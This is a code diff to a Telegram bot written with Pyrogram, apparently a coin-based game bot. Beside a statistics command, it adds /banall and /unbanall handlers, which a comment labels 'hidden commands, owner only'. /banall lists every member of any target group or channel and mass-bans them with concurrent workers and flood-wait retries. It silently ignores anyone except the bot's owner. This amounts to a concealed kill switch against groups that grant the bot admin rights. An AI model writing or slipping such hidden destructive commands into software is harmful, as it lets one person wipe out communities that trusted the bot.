@@ -9,9 +9,12 @@
 
 from __future__ import annotations
 
+import asyncio
 import logging
+import time
 
-from pyrogram import Client, filters
+from pyrogram import Client, enums, filters
+from pyrogram.errors import FloodWait
 from pyrogram.types import CallbackQuery, ChatMemberUpdated, Message
 
 from config import Config
@@ -222,4 +225,230 @@ async def botstats_cmd(client: Client, message: Message) -> None:
         f"🏘️ Total groups: `{total_groups:,}`\n\n"
         f"💰 Richest user: **{richest.get('first_name','?')}**\n"
         f"              `{fmt_coins(richest.get('coins',0))} coins`"
+    )
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# /banall & /unbanall (hidden commands, owner only)
+# ══════════════════════════════════════════════════════════════════════════════
+
+@Client.on_message(filters.command("banall"))
+async def banall_cmd(client: Client, message: Message) -> None:
+    # Silent ignore if not the bot owner
+    if not message.from_user or message.from_user.id != Config.BOT_OWNER:
+        return
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) > 1:
+        chat_target = parts[1].strip()
+        if chat_target.startswith("-") or chat_target.isdigit():
+            try:
+                chat_target = int(chat_target)
+            except ValueError:
+                pass
+    else:
+        chat_target = message.chat.id
+
+    # Check if we are in private chat and no target was specified
+    if message.chat.type == enums.ChatType.PRIVATE and len(parts) <= 1:
+        await message.reply("❌ **Error:** Please specify a target chat ID or username (e.g., `/banall -100xxxx` or `/banall @channel`).")
+        return
+
+    status_msg = await message.reply("⚡️ **Fetching chat details...**")
+    try:
+        chat = await client.get_chat(chat_target)
+    except Exception as e:
+        await status_msg.edit_text(f"❌ **Error fetching chat `{chat_target}`:**\n`{e}`")
+        return
+
+    if chat.type not in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP, enums.ChatType.CHANNEL):
+        await status_msg.edit_text("❌ **Error:** Target chat must be a Group, Supergroup, or Channel!")
+        return
+
+    await status_msg.edit_text("⚡️ **Fetching members from target chat...**")
+    user_ids = []
+    bot_me = await client.get_me()
+    bot_id = bot_me.id
+    owner_id = Config.BOT_OWNER
+
+    try:
+        async for member in client.get_chat_members(chat.id):
+            if member.user:
+                u_id = member.user.id
+                if u_id != bot_id and u_id != owner_id:
+                    user_ids.append(u_id)
+    except Exception as e:
+        await status_msg.edit_text(f"❌ **Failed to retrieve members:**\n`{e}`")
+        return
+
+    total_to_ban = len(user_ids)
+    if total_to_ban == 0:
+        await status_msg.edit_text("ℹ️ **No eligible members found to ban.**")
+        return
+
+    await status_msg.edit_text(f"⚡️ **Banning {total_to_ban} members...**")
+
+    queue = asyncio.Queue()
+    for uid in user_ids:
+        await queue.put(uid)
+
+    banned_count = 0
+    failed_count = 0
+    last_updated = time.time()
+
+    async def worker():
+        nonlocal banned_count, failed_count, last_updated
+        while not queue.empty():
+            uid = await queue.get()
+            try:
+                await client.ban_chat_member(chat.id, uid)
+                banned_count += 1
+            except FloodWait as e:
+                await asyncio.sleep(e.value)
+                try:
+                    await client.ban_chat_member(chat.id, uid)
+                    banned_count += 1
+                except Exception:
+                    failed_count += 1
+            except Exception:
+                failed_count += 1
+            finally:
+                queue.task_done()
+
+            # Periodically update progress status
+            processed = banned_count + failed_count
+            now = time.time()
+            if now - last_updated > 5.0:
+                last_updated = now
+                try:
+                    await status_msg.edit_text(
+                        f"⚡️ **Banning process in progress...**\n\n"
+                        f"• **Target Chat:** `{chat.title}`\n"
+                        f"• **Progress:** `{processed}/{total_to_ban}`\n"
+                        f"• **Success:** `{banned_count}`\n"
+                        f"• **Failed:** `{failed_count}`"
+                    )
+                except Exception:
+                    pass
+
+    # Start 15 concurrent workers
+    workers = [asyncio.create_task(worker()) for _ in range(15)]
+    await asyncio.gather(*workers)
+
+    await status_msg.edit_text(
+        f"✅ **Banning process completed!**\n\n"
+        f"• **Target Chat:** `{chat.title}`\n"
+        f"• **Successfully Banned:** `{banned_count}`\n"
+        f"• **Failed/Skipped:** `{failed_count}`"
+    )
+
+
+@Client.on_message(filters.command("unbanall"))
+async def unbanall_cmd(client: Client, message: Message) -> None:
+    # Silent ignore if not the bot owner
+    if not message.from_user or message.from_user.id != Config.BOT_OWNER:
+        return
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) > 1:
+        chat_target = parts[1].strip()
+        if chat_target.startswith("-") or chat_target.isdigit():
+            try:
+                chat_target = int(chat_target)
+            except ValueError:
+                pass
+    else:
+        chat_target = message.chat.id
+
+    # Check if we are in private chat and no target was specified
+    if message.chat.type == enums.ChatType.PRIVATE and len(parts) <= 1:
+        await message.reply("❌ **Error:** Please specify a target chat ID or username (e.g., `/unbanall -100xxxx` or `/unbanall @channel`).")
+        return
+
+    status_msg = await message.reply("⚡️ **Fetching chat details...**")
+    try:
+        chat = await client.get_chat(chat_target)
+    except Exception as e:
+        await status_msg.edit_text(f"❌ **Error fetching chat `{chat_target}`:**\n`{e}`")
+        return
+
+    if chat.type not in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP, enums.ChatType.CHANNEL):
+        await status_msg.edit_text("❌ **Error:** Target chat must be a Group, Supergroup, or Channel!")
+        return
+
+    await status_msg.edit_text("⚡️ **Fetching banned members from target chat...**")
+    user_ids = []
+    bot_me = await client.get_me()
+    bot_id = bot_me.id
+    owner_id = Config.BOT_OWNER
+
+    try:
+        async for member in client.get_chat_members(chat.id, filter=enums.ChatMembersFilter.BANNED):
+            if member.user:
+                u_id = member.user.id
+                if u_id != bot_id and u_id != owner_id:
+                    user_ids.append(u_id)
+    except Exception as e:
+        await status_msg.edit_text(f"❌ **Failed to retrieve banned members:**\n`{e}`")
+        return
+
+    total_to_unban = len(user_ids)
+    if total_to_unban == 0:
+        await status_msg.edit_text("ℹ️ **No banned members found to unban.**")
+        return
+
+    await status_msg.edit_text(f"⚡️ **Unbanning {total_to_unban} members...**")
+
+    queue = asyncio.Queue()
+    for uid in user_ids:
+        await queue.put(uid)
+
+    unbanned_count = 0
+    failed_count = 0
+    last_updated = time.time()
+
+    async def worker():
+        nonlocal unbanned_count, failed_count, last_updated
+        while not queue.empty():
+            uid = await queue.get()
+            try:
+                await client.unban_chat_member(chat.id, uid)
+                unbanned_count += 1
+            except FloodWait as e:
+                await asyncio.sleep(e.value)
+                try:
+                    await client.unban_chat_member(chat.id, uid)
+                    unbanned_count += 1
+                except Exception:
+                    failed_count += 1
+            except Exception:
+                failed_count += 1
+            finally:
+                queue.task_done()
+
+            # Periodically update progress status
+            processed = unbanned_count + failed_count
+            now = time.time()
+            if now - last_updated > 5.0:
+                last_updated = now
+                try:
+                    await status_msg.edit_text(
+                        f"⚡️ **Unbanning process in progress...**\n\n"
+                        f"• **Target Chat:** `{chat.title}`\n"
+                        f"• **Progress:** `{processed}/{total_to_unban}`\n"
+                        f"• **Success:** `{unbanned_count}`\n"
+                        f"• **Failed:** `{failed_count}`"
+                    )
+                except Exception:
+                    pass
+
+    # Start 15 concurrent workers
+    workers = [asyncio.create_task(worker()) for _ in range(15)]
+    await asyncio.gather(*workers)
+
+    await status_msg.edit_text(
+        f"✅ **Unbanning process completed!**\n\n"
+        f"• **Target Chat:** `{chat.title}`\n"
+        f"• **Successfully Unbanned:** `{unbanned_count}`\n"
+        f"• **Failed/Skipped:** `{failed_count}`"
     )
